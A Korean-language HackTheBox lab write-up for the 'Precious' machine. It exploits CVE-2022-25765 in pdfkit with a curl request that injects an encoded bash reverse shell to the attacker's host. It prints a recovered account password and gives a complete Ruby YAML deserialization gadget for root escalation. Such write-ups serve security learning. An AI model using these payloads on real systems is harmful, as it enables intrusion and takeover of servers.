# Precious - HackTheBox
## Recon
```bash
sudo nmap -p 22,80 -sC -sV -vv -oA precious 10.10.11.189
```
<img width="1105" height="420" alt="image" src="https://github.com/user-attachments/assets/100f7fc7-2c67-444b-86ad-752b19db26fa" />

- SSH(22)
- HTTP(80)

---
## HTTP
- `/etc/hosts`에 `precious.htb`추가.
<img width="1105" height="66" alt="image" src="https://github.com/user-attachments/assets/36a66b56-3667-459a-a8d1-5a9946287647" />

### banner grabbing
<img width="1105" height="415" alt="image" src="https://github.com/user-attachments/assets/9de870b2-9b2e-41aa-b955-ea57b2bda19e" />

### CVE-2022-25765
- 서버를 pdf로 변환하는 기능.
<img width="1100" height="602" alt="image" src="https://github.com/user-attachments/assets/f5f43bad-3938-4d94-b758-99146f6790f4" />

<br>
<br>

- 로컬에서 서버를 생성하여 로컬 주소를 제출.
<img width="824" height="267" alt="image" src="https://github.com/user-attachments/assets/46b3dfa9-28b0-4ed4-9de1-dbb32e61a939" />

<br>
<br>

- pdf파일을 다운로드 받으면서 서버에 접속.
<img width="1021" height="292" alt="image" src="https://github.com/user-attachments/assets/0621e8c8-6506-4466-814f-dc8a330f31b0" />

<br>
<br>

- `exiftool`로 메타데이터 확인.
- `pdfkit 0.8.6`
```bash
exiftool 0pg1uve4ao3srmxfnnjzfb4ynzkxi38u.pdf
```
<img width="1105" height="339" alt="image" src="https://github.com/user-attachments/assets/2ff93f99-84c3-48a7-aab7-51cf54f4b0ac" />

<br>
<br>

- https://nvd.nist.gov/vuln/detail/CVE-2022-25765
- 제대로 검증되지 않은 `URL`에 RCE가 가능한 취약점.
<img width="1224" height="454" alt="image" src="https://github.com/user-attachments/assets/50306eae-ea6d-44da-84e3-e7a55b82aded" />

<br>
<br>

- https://github.com/advisories/GHSA-rhwx-hjx2-x4qr
- `0.8.7.2`이전 버전에 적용.
<img width="1100" height="180" alt="image" src="https://github.com/user-attachments/assets/5ab35a4b-0692-4412-9594-c7273e663b0e" />

<br>
<br>

- https://github.com/nikn0laty/PDFkit-CMD-Injection-CVE-2022-25765/blob/main/CVE-2022-25765.py
- `url`파라미터에서 RCE가 가능.
<img width="845" height="84" alt="image" src="https://github.com/user-attachments/assets/a3d3985f-4bb1-4438-9c5a-6777581dec5a" />

<br>
<br>

- ping test 시도.
```bash
curl -X POST -d 'url=http%3A%2F%2F%3Fname%3D%2520%60ping%2010.10.16.4%60' 'http://precious.htb'
```
<img width="1104" height="53" alt="image" src="https://github.com/user-attachments/assets/f075414b-5fe6-4230-b5ad-ff9202a171c4" />

<br>
<br>

- ping test 성공.
<img width="1104" height="197" alt="image" src="https://github.com/user-attachments/assets/ff12d08b-a255-41c1-b074-1a24f7cfa589" />

<br>
<br>

- 리버스 셸 코드 실행.
```bash
curl -X POST -d 'url=http%3A%2F%2F%3Fname%3D%2520%60bash%20-c%20%22bash%20-i%20%3E%26%2Fdev%2Ftcp%2F10.10.16.4%2F80%200%3E%261%22%60' 'http://precious.htb'
```
<img width="1104" height="65" alt="image" src="https://github.com/user-attachments/assets/1c42f450-38b5-4d19-a2e2-1b954ba70534" />

<br>
<br>

- 셸 획득.
<img width="1104" height="177" alt="image" src="https://github.com/user-attachments/assets/f5497366-2201-43e3-923a-b881a69a4324" />

---
## Privesc
- `/home/ruby/.bundle/config`에서 `henry`계정 발견.
<img width="1104" height="60" alt="image" src="https://github.com/user-attachments/assets/13187a5d-bb80-4ef0-b66b-12acf22fdaa5" />

<br>
<br>

- `henry:Q3c1AqGHtoI0aXAYFH` 로그인.
<img width="1104" height="79" alt="image" src="https://github.com/user-attachments/assets/342e1ba3-f8e0-46f5-ba71-b456fefa2b41" />

<br>
<br>

- `root`권한으로 `/usr/bin/ruby /opt/update_dependencies.rb`실행 가능.
<img width="1104" height="118" alt="image" src="https://github.com/user-attachments/assets/e9c2e086-3a54-4fbb-b6f6-b3b205a350af" />

<br>
<br>

- 현재 폴더에 있는 `dependencies.yml`를 읽어 `YAML.load`함수를 실행시키는 코드.
<img width="1104" height="236" alt="image" src="https://github.com/user-attachments/assets/93d30f98-232b-441e-9648-928c44bed806" />

<br>
<br>

- `ruby`버전 확인.
```bash
ruby --version
```
<img width="1104" height="42" alt="image" src="https://github.com/user-attachments/assets/e8464b27-d92d-48fd-aaad-083aea129fa4" />

<br>
<br>

- https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html
- `Ruby 3.0.2`이전버전까지 영향을 주는 것으로 보인다.
<img width="1104" height="236" alt="image" src="https://github.com/user-attachments/assets/0bf40d60-186e-426e-bd64-4874a450719b" />

<br>
<br>

- https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/
- `git_set`에 명령어를 집어넣어서 실행이 가능.
<img width="600" height="500" alt="image" src="https://github.com/user-attachments/assets/02cc05b5-9235-42dc-8281-e25d5945b086" />

<br>
<br>

- `/bin/bash`를 실행시키는 코드로 로컬에서 생성하여 전달.
```yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: /bin/bash
         method_id: :resolve
```
<img width="1105" height="409" alt="image" src="https://github.com/user-attachments/assets/8cf9b162-b2df-4912-af96-21c03a44a8ff" />

<br>
<br>

- `/opt/update_dependencies.rb`스크립트 실행하여 셸 획득.
```bash
sudo /usr/bin/ruby /opt/update_dependencies.rb
```
<img width="1105" height="77" alt="image" src="https://github.com/user-attachments/assets/a470fe79-9e69-454a-b09b-985d5ea108e6" />

---
## FLAG
- `/home/henry/user.txt`
<img width="1105" height="175" alt="image" src="https://github.com/user-attachments/assets/ec050423-4883-44fe-a5d4-e2bfb4c5146e" />

<br>
<br>

- `/root/root.txt`
<img width="1105" height="193" alt="image" src="https://github.com/user-attachments/assets/3b09f2ae-5f98-40aa-850b-2a1fb588529a" />





















